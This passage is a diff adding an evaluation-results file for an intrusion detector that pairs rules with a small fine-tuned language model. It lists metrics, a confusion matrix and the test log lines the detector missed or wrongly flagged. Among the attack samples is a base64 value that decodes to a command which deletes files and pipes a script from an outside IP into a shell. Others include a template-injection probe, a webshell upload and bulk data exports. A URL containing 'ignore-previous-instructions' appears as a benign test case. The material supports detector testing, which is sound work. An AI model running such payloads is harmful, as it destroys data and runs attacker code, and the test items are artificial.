@@ -1,0 +1,2001 @@
+{
+ "overall": {
+  "precision": 0.6739,
+  "recall": 0.8611,
+  "f1": 0.7561,
+  "tp": 93,
+  "fp": 45,
+  "fn": 15,
+  "tn": 50,
+  "category_accuracy_on_attacks": 0.7407,
+  "hard_negative_fp": 19,
+  "hard_negatives": 31
+ },
+ "per_category": {
+  "ANOMALOUS_LOGIN": {
+   "n": 2,
+   "detected": 2,
+   "recall": 1.0,
+   "category_correct": 2
+  },
+  "B64_PAYLOAD": {
+   "n": 2,
+   "detected": 0,
+   "recall": 0.0,
+   "category_correct": 0
+  },
+  "BRUTE_FORCE": {
+   "n": 23,
+   "detected": 23,
+   "recall": 1.0,
+   "category_correct": 23
+  },
+  "CMD_INJECTION": {
+   "n": 1,
+   "detected": 1,
+   "recall": 1.0,
+   "category_correct": 1
+  },
+  "CRED_STUFFING": {
+   "n": 12,
+   "detected": 8,
+   "recall": 0.6667,
+   "category_correct": 7
+  },
+  "DATA_EXFIL": {
+   "n": 2,
+   "detected": 0,
+   "recall": 0.0,
+   "category_correct": 0
+  },
+  "DEFENSE_EVASION": {
+   "n": 2,
+   "detected": 2,
+   "recall": 1.0,
+   "category_correct": 0
+  },
+  "LOG4SHELL": {
+   "n": 1,
+   "detected": 1,
+   "recall": 1.0,
+   "category_correct": 1
+  },
+  "PASSWORD_SPRAY": {
+   "n": 5,
+   "detected": 5,
+   "recall": 1.0,
+   "category_correct": 5
+  },
+  "PATH_TRAVERSAL": {
+   "n": 8,
+   "detected": 8,
+   "recall": 1.0,
+   "category_correct": 8
+  },
+  "PERSISTENCE": {
+   "n": 2,
+   "detected": 2,
+   "recall": 1.0,
+   "category_correct": 0
+  },
+  "PRIV_ESC": {
+   "n": 6,
+   "detected": 6,
+   "recall": 1.0,
+   "category_correct": 4
+  },
+  "PROMPT_INJECTION": {
+   "n": 3,
+   "detected": 3,
+   "recall": 1.0,
+   "category_correct": 2
+  },
+  "RECON": {
+   "n": 15,
+   "detected": 10,
+   "recall": 0.6667,
+   "category_correct": 5
+  },
+  "SQLI": {
+   "n": 9,
+   "detected": 9,
+   "recall": 1.0,
+   "category_correct": 9
+  },
+  "SSRF": {
+   "n": 7,
+   "detected": 7,
+   "recall": 1.0,
+   "category_correct": 7
+  },
+  "WEBSHELL": {
+   "n": 2,
+   "detected": 1,
+   "recall": 0.5,
+   "category_correct": 1
+  },
+  "XSS": {
+   "n": 6,
+   "detected": 5,
+   "recall": 0.8333,
+   "category_correct": 5
+  }
+ },
+ "per_predicted_type": {
+  "BRUTE_FORCE": {
+   "flagged": 87,
+   "precision": 0.5172,
+   "by_rule": 22,
+   "by_llm": 65
+  },
+  "CMD_INJECTION": {
+   "flagged": 3,
+   "precision": 0.6667,
+   "by_rule": 3,
+   "by_llm": 0
+  },
+  "LOG4SHELL": {
+   "flagged": 1,
+   "precision": 1.0,
+   "by_rule": 1,
+   "by_llm": 0
+  },
+  "MALWARE": {
+   "flagged": 8,
+   "precision": 0.75,
+   "by_rule": 0,
+   "by_llm": 8
+  },
+  "PATH_TRAVERSAL": {
+   "flagged": 8,
+   "precision": 1.0,
+   "by_rule": 8,
+   "by_llm": 0
+  },
+  "PRIV_ESC": {
+   "flagged": 4,
+   "precision": 1.0,
+   "by_rule": 4,
+   "by_llm": 0
+  },
+  "RECON": {
+   "flagged": 6,
+   "precision": 1.0,
+   "by_rule": 6,
+   "by_llm": 0
+  },
+  "SQLI": {
+   "flagged": 9,
+   "precision": 1.0,
+   "by_rule": 9,
+   "by_llm": 0
+  },
+  "SSRF": {
+   "flagged": 7,
+   "precision": 1.0,
+   "by_rule": 7,
+   "by_llm": 0
+  },
+  "XSS": {
+   "flagged": 5,
+   "precision": 1.0,
+   "by_rule": 5,
+   "by_llm": 0
+  }
+ },
+ "confusion": {
+  "ANOMALOUS_LOGIN": {
+   "BRUTE_FORCE": 2
+  },
+  "B64_PAYLOAD": {
+   "-": 2
+  },
+  "BENIGN": {
+   "-": 50,
+   "BRUTE_FORCE": 42,
+   "MALWARE": 2,
+   "CMD_INJECTION": 1
+  },
+  "BRUTE_FORCE": {
+   "BRUTE_FORCE": 23
+  },
+  "CMD_INJECTION": {
+   "CMD_INJECTION": 1
+  },
+  "CRED_STUFFING": {
+   "-": 4,
+   "BRUTE_FORCE": 7,
+   "MALWARE": 1
+  },
+  "DATA_EXFIL": {
+   "-": 2
+  },
+  "DEFENSE_EVASION": {
+   "BRUTE_FORCE": 2
+  },
+  "LOG4SHELL": {
+   "LOG4SHELL": 1
+  },
+  "PASSWORD_SPRAY": {
+   "BRUTE_FORCE": 5
+  },
+  "PATH_TRAVERSAL": {
+   "PATH_TRAVERSAL": 8
+  },
+  "PERSISTENCE": {
+   "BRUTE_FORCE": 2
+  },
+  "PRIV_ESC": {
+   "PRIV_ESC": 4,
+   "CMD_INJECTION": 1,
+   "BRUTE_FORCE": 1
+  },
+  "PROMPT_INJECTION": {
+   "MALWARE": 1,
+   "RECON": 1,
+   "BRUTE_FORCE": 1
+  },
+  "RECON": {
+   "MALWARE": 3,
+   "RECON": 5,
+   "-": 5,
+   "BRUTE_FORCE": 2
+  },
+  "SQLI": {
+   "SQLI": 9
+  },
+  "SSRF": {
+   "SSRF": 7
+  },
+  "WEBSHELL": {
+   "-": 1,
+   "MALWARE": 1
+  },
+  "XSS": {
+   "XSS": 5,
+   "-": 1
+  }
+ },
+ "errors": [
+  {
+   "kind": "FN",
+   "id": "sample_nginx:14",
+   "category": "XSS",
+   "subtle": false,
+   "line": "45.33.32.156 - - [23/May/2026:08:15:08 +0000] \"POST /comment HTTP/1.1\" 400 128 \"-\" \"Mozilla/5.0\"",
+   "llm_failed": false
+  },
+  {
+   "kind": "FN",
+   "id": "sample_nginx:27",
+   "category": "RECON",
+   "subtle": true,
+   "line": "203.0.113.42 - - [23/May/2026:08:35:05 +0000] \"GET /api/v1/swagger.json HTTP/1.1\" 200 18432 \"-\" \"Mozilla/5.0\"",
+   "llm_failed": false
+  },
+  {
+   "kind": "FN",
+   "id": "sample_nginx:29",
+   "category": "RECON",
+   "subtle": true,
+   "line": "203.0.113.42 - - [23/May/2026:08:35:07 +0000] \"GET /admin/config HTTP/1.1\" 401 128 \"-\" \"Mozilla/5.0\"",
+   "llm_failed": false
+  },
+  {
+   "kind": "FN",
+   "id": "sample_nginx:30",
+   "category": "CRED_STUFFING",
+   "subtle": true,
+   "line": "185.220.101.1 - - [23/May/2026:08:40:00 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"python-requests/2.28\"",
+   "llm_failed": false
+  },
+  {
+   "kind": "FP",
+   "id": "sample_nginx:35",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "10.0.0.10 - - [23/May/2026:08:45:00 +0000] \"GET /api/products HTTP/1.1\" 200 4096 \"-\" \"Mozilla/5.0\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:6",
+   "pred": "MALWARE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "10.20.0.14 - - [02/Jun/2026:11:01:18 +0000] \"GET /api/v2/healthz HTTP/1.1\" 200 15 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:11",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "10.20.0.14 - - [02/Jun/2026:11:02:23 +0000] \"GET /help/returns HTTP/1.1\" 200 7720 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.5 Safari/605.1.15\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:12",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "10.20.0.14 - - [02/Jun/2026:11:03:36 +0000] \"GET /sitemap.xml HTTP/1.1\" 200 4410 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:13",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "10.20.0.31 - - [02/Jun/2026:11:03:49 +0000] \"GET /catalog/shoes HTTP/1.1\" 200 9120 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.5 Safari/605.1.15\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:14",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "172.20.1.8 - - [02/Jun/2026:11:03:02 +0000] \"GET /api/v2/cart HTTP/1.1\" 200 902 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:15",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "82.45.12.9 - - [02/Jun/2026:11:03:15 +0000] \"GET /robots.txt HTTP/1.1\" 200 120 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/126.0 Mobile Safari/537.36\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:20",
+   "pred": "MALWARE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "172.20.1.8 - - [02/Jun/2026:11:05:20 +0000] \"GET /assets/site.css HTTP/1.1\" 200 14001 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:21",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "82.45.12.9 - - [02/Jun/2026:11:05:33 +0000] \"POST /api/v2/session HTTP/1.1\" 200 340 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/126.0 Mobile Safari/537.36\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:22",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "151.101.1.69 - - [02/Jun/2026:11:05:46 +0000] \"GET /api/v2/healthz HTTP/1.1\" 200 15 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:23",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "10.20.0.14 - - [02/Jun/2026:11:05:59 +0000] \"GET /assets/main.4f2a.js HTTP/1.1\" 200 120334 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.5 Safari/605.1.15\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:24",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "10.20.0.14 - - [02/Jun/2026:11:06:12 +0000] \"GET /api/v2/products?page=3&sort=-rating HTTP/1.1\" 200 5100 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:25",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "10.20.0.31 - - [02/Jun/2026:11:06:25 +0000] \"GET /old-promo HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.5 Safari/605.1.15\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:26",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "172.20.1.8 - - [02/Jun/2026:11:06:38 +0000] \"GET /catalog/shoes/881 HTTP/1.1\" 200 3402 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:27",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "82.45.12.9 - - [02/Jun/2026:11:06:51 +0000] \"GET /help/returns HTTP/1.1\" 200 7720 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/126.0 Mobile Safari/537.36\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:28",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "151.101.1.69 - - [02/Jun/2026:11:07:04 +0000] \"GET /sitemap.xml HTTP/1.1\" 200 4410 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:29",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "10.20.0.14 - - [02/Jun/2026:11:07:17 +0000] \"GET /catalog/shoes HTTP/1.1\" 200 9120 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.5 Safari/605.1.15\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:30",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "10.20.0.14 - - [02/Jun/2026:11:07:30 +0000] \"GET /api/v2/cart HTTP/1.1\" 200 902 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:31",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "10.20.0.31 - - [02/Jun/2026:11:07:43 +0000] \"GET /robots.txt HTTP/1.1\" 200 120 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.5 Safari/605.1.15\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:32",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "10.20.0.31 - - [02/Jun/2026:11:09:00 +0000] \"GET /search?q=union+jack+t-shirt HTTP/1.1\" 200 3300 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.5 Safari/605.1.15\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:33",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "10.20.0.31 - - [02/Jun/2026:11:09:04 +0000] \"GET /blog/what-is-cross-site-scripting HTTP/1.1\" 200 22100 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.5 Safari/605.1.15\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:34",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "82.45.12.9 - - [02/Jun/2026:11:09:10 +0000] \"GET /search?q=sleep+mask+for+travel HTTP/1.1\" 200 4100 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/126.0 Mobile Safari/537.36\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:35",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "82.45.12.9 - - [02/Jun/2026:11:09:15 +0000] \"GET /catalog/scripts-and-fonts-poster HTTP/1.1\" 200 3100 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/126.0 Mobile Safari/537.36\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:36",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "10.20.0.14 - - [02/Jun/2026:11:10:00 +0000] \"GET /admin/reports/export?format=csv&range=2026-05 HTTP/1.1\" 200 51234 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:37",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "10.20.0.14 - - [02/Jun/2026:11:10:30 +0000] \"GET /admin/orders/export.csv?status=shipped&page=1 HTTP/1.1\" 200 88112 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36\""
+  },
+  {
+   "kind": "FN",
+   "id": "nginx2:61",
+   "category": "CRED_STUFFING",
+   "subtle": true,
+   "line": "89.248.160.17 - - [02/Jun/2026:11:33:17 +0000] \"POST /api/v2/session HTTP/1.1\" 401 61 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"",
+   "llm_failed": false
+  },
+  {
+   "kind": "FN",
+   "id": "nginx2:62",
+   "category": "CRED_STUFFING",
+   "subtle": true,
+   "line": "89.248.160.44 - - [02/Jun/2026:11:36:34 +0000] \"POST /api/v2/session HTTP/1.1\" 401 61 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"",
+   "llm_failed": false
+  },
+  {
+   "kind": "FN",
+   "id": "nginx2:63",
+   "category": "CRED_STUFFING",
+   "subtle": true,
+   "line": "89.248.160.90 - - [02/Jun/2026:11:39:51 +0000] \"POST /api/v2/session HTTP/1.1\" 401 61 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"",
+   "llm_failed": false
+  },
+  {
+   "kind": "FN",
+   "id": "nginx2:71",
+   "category": "RECON",
+   "subtle": true,
+   "line": "193.106.191.50 - - [02/Jun/2026:11:50:05 +0000] \"GET /backup.zip HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 (compatible; Nuclei)\"",
+   "llm_failed": false
+  },
+  {
+   "kind": "FN",
+   "id": "nginx2:72",
+   "category": "RECON",
+   "subtle": true,
+   "line": "193.106.191.50 - - [02/Jun/2026:11:50:06 +0000] \"GET /.svn/entries HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 (compatible; Nuclei)\"",
+   "llm_failed": false
+  },
+  {
+   "kind": "FN",
+   "id": "nginx2:73",
+   "category": "RECON",
+   "subtle": true,
+   "line": "193.106.191.50 - - [02/Jun/2026:11:50:07 +0000] \"GET /v2/_catalog HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 (compatible; Nuclei)\"",
+   "llm_failed": false
+  },
+  {
+   "kind": "FN",
+   "id": "nginx2:74",
+   "category": "B64_PAYLOAD",
+   "subtle": true,
+   "line": "91.92.240.8 - - [02/Jun/2026:11:55:00 +0000] \"POST /api/v2/templates/render?body=e3tjb25maWcuX19jbGFzc19ffX0= HTTP/1.1\" 200 88 \"-\" \"python-httpx/0.27\"",
+   "llm_failed": false
+  },
+  {
+   "kind": "FN",
+   "id": "nginx2:75",
+   "category": "B64_PAYLOAD",
+   "subtle": true,
+   "line": "91.92.240.8 - - [02/Jun/2026:11:55:05 +0000] \"GET /api/v2/run?c=cm0gLXJmIC90bXAvKiAmJiBjdXJsIDkxLjkyLjI0MC44L3ggfCBzaA== HTTP/1.1\" 200 40 \"-\" \"python-httpx/0.27\"",
+   "llm_failed": false
+  },
+  {
+   "kind": "FN",
+   "id": "nginx2:76",
+   "category": "DATA_EXFIL",
+   "subtle": true,
+   "line": "10.20.0.99 - - [02/Jun/2026:03:41:10 +0000] \"GET /admin/customers/export?format=json&limit=500000&fields=email,dob,card_last4 HTTP/1.1\" 200 702113442 \"-\" \"curl/8.6.0\"",
+   "llm_failed": false
+  },
+  {
+   "kind": "FN",
+   "id": "nginx2:77",
+   "category": "DATA_EXFIL",
+   "subtle": true,
+   "line": "10.20.0.99 - - [02/Jun/2026:03:42:00 +0000] \"GET /admin/backups/latest.tar.gz HTTP/1.1\" 200 2311098234 \"-\" \"aria2/1.37.0\"",
+   "llm_failed": false
+  },
+  {
+   "kind": "FN",
+   "id": "nginx2:78",
+   "category": "WEBSHELL",
+   "subtle": true,
+   "line": "185.244.25.91 - - [02/Jun/2026:12:01:00 +0000] \"POST /uploads/avatar_9912.php HTTP/1.1\" 200 31 \"-\" \"Mozilla/5.0\"",
+   "llm_failed": false
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:83",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "10.20.0.14 - - [02/Jun/2026:12:13:21 +0000] \"GET /account/profile HTTP/1.1\" 200 2210 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.5 Safari/605.1.15\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:84",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "10.20.0.14 - - [02/Jun/2026:12:14:28 +0000] \"GET /old-promo HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:85",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "10.20.0.31 - - [02/Jun/2026:12:15:35 +0000] \"GET / HTTP/1.1\" 200 6011 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.5 Safari/605.1.15\""
+  },
+  {
+   "kind": "FP",
+   "id": "nginx2:86",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "172.20.1.8 - - [02/Jun/2026:12:16:42 +0000] \"GET /assets/main.4f2a.js HTTP/1.1\" 200 120334 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0\""
+  },
+  {
+   "kind": "FP",
+   "id": "auth2:10",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "Jun  2 09:35:01 app-02 sshd[5005]: Accepted publickey for jenkins from 10.20.0.50 port 41005 ssh2: ED25519 SHA256:k5"
+  },
+  {
+   "kind": "FP",
+   "id": "auth2:11",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "Jun  2 09:35:02 app-02 sshd[5005]: pam_unix(sshd:session): session opened for user jenkins(uid=2005) by (uid=0)"
+  },
+  {
+   "kind": "FP",
+   "id": "auth2:12",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "Jun  2 09:50:00 app-02 sudo:   ops : TTY=pts/1 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/apt-get upgrade -y"
+  },
+  {
+   "kind": "FP",
+   "id": "auth2:13",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "Jun  2 09:51:10 app-02 sudo:   ops : TTY=pts/1 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx"
+  },
+  {
+   "kind": "FP",
+   "id": "auth2:14",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "Jun  2 09:52:00 app-02 sudo:   maria : TTY=pts/1 ; PWD=/home/maria ; USER=root ; COMMAND=/usr/bin/journalctl -u app --since today"
+  },
+  {
+   "kind": "FP",
+   "id": "auth2:15",
+   "pred": "CMD_INJECTION",
+   "src": "rule",
+   "hard_negative": true,
+   "line": "Jun  2 09:53:30 app-02 sudo:   ops : TTY=pts/1 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash -G developers kiran"
+  },
+  {
+   "kind": "FP",
+   "id": "auth2:16",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "Jun  2 09:54:00 app-02 sudo:   ops : TTY=pts/1 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/passwd -e kiran"
+  },
+  {
+   "kind": "FP",
+   "id": "auth2:17",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "Jun  2 09:55:00 app-02 sshd[5100]: Failed password for maria from 10.20.0.41 port 41100 ssh2"
+  },
+  {
+   "kind": "FP",
+   "id": "auth2:18",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "Jun  2 09:55:06 app-02 sshd[5101]: Accepted password for maria from 10.20.0.41 port 41101 ssh2"
+  },
+  {
+   "kind": "FP",
+   "id": "auth2:19",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "Jun  2 10:00:01 app-02 CRON[6120]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)"
+  },
+  {
+   "kind": "FP",
+   "id": "auth2:20",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "Jun  2 10:00:01 app-02 CRON[6121]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)"
+  },
+  {
+   "kind": "FP",
+   "id": "auth2:21",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "Jun  2 10:02:00 app-02 sshd[5102]: Connection closed by 10.20.0.50 port 41005 [preauth]"
+  },
+  {
+   "kind": "FP",
+   "id": "auth2:22",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "Jun  2 10:03:00 app-02 sshd[5101]: Received disconnect from 10.20.0.41 port 41101:11: disconnected by user"
+  },
+  {
+   "kind": "FP",
+   "id": "auth2:23",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "Jun  2 10:04:00 app-02 sudo:   jenkins : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/docker compose -f /srv/app/docker-compose.yml up -d"
+  },
+  {
+   "kind": "FP",
+   "id": "auth2:48",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": false,
+   "line": "Jun  2 11:00:00 app-02 sshd[5200]: Accepted publickey for ops from 10.20.0.40 port 42000 ssh2: ED25519 SHA256:z0"
+  },
+  {
+   "kind": "FP",
+   "id": "inject_test:7",
+   "pred": "BRUTE_FORCE",
+   "src": "llm",
+   "hard_negative": true,
+   "line": "82.45.12.9 - - [02/Jun/2026:14:01:10 +0000] \"GET /blog/ignore-previous-instructions-a-history-of-prompt-attacks HTTP/1.1\" 200 21000 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/126.0 Mobile Safari/537.36\""
+  }
+ ],
+ "run": "local+ft_v1",
+ "provider": "local",
+ "model": "Qwen2.5-0.5B-Instruct-bnb-4bit+lora",
+ "split": "test",
+ "n_lines": 203,
+ "n_attacks": 108,
+ "llm_failed_lines": 0,
+ "stream_wall_s": {
+  "sample_nginx": 16.34,
+  "sample_auth": 11.18,
+  "nginx2": 56.28,
+  "auth2": 185.28,
+  "inject_test": 12.34
+ },
+ "job_status": {
+  "sample_nginx": "completed",
+  "sample_auth": "completed",
+  "nginx2": "completed",
+  "auth2": "completed",
+  "inject_test": "completed"
+ },
+ "cost": {
+  "llm_calls": 9,
+  "cached_calls": 0,
+  "tokens_in": 17551,
+  "tokens_out": 2694,
+  "usd_estimate": 0.0,
+  "latency_p50_s": 13.808,
+  "latency_p95_s": 104.132
+ },
+ "total_wall_s": 281.43,
+ "local": {
+  "batches": 9,
+  "json_valid_first_try": 8,
+  "json_valid_after_retry": 9,
+  "json_validity_rate": 0.8889,
+  "retries": 1,
+  "base_model": "unsloth/Qwen2.5-0.5B-Instruct-bnb-4bit",
+  "adapter": "evals\\finetune\\runs\\r16_lr2e-4\\adapter"
+ },
+ "predictions": [
+  {
+   "id": "sample_nginx:0",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:1",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:2",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:3",
+   "pred": null,
+   "src": null,
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:4",
+   "pred": "SQLI",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:5",
+   "pred": "SQLI",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:6",
+   "pred": "SQLI",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:7",
+   "pred": "SQLI",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:8",
+   "pred": "SQLI",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:9",
+   "pred": "SSRF",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:10",
+   "pred": "SSRF",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:11",
+   "pred": "SSRF",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:12",
+   "pred": "SSRF",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:13",
+   "pred": "XSS",
+   "src": "rule",
+   "llm_failed": false
+  },
+  {
+   "id": "sample_nginx:14",
+   "pred": null,
+   "src": null,
